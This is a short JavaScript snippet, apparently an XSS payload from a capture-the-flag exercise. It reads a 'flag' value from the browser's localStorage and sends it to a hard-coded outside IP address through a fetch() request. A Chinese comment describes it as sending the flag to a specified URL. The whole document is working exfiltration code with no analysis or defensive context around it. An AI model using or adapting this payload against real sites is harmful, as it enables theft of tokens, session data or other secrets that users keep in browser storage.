const flag = localStorage.getItem('flag');

// 发送 flag 值到指定的 URL
fetch(`http://81.71.13.76:5859?flag=${encodeURIComponent(flag)}`, {
    method: 'GET',
})
.then(response => response.text())
.then(data => console.log('Response:', data))
.catch(error => console.error('Error:', error));
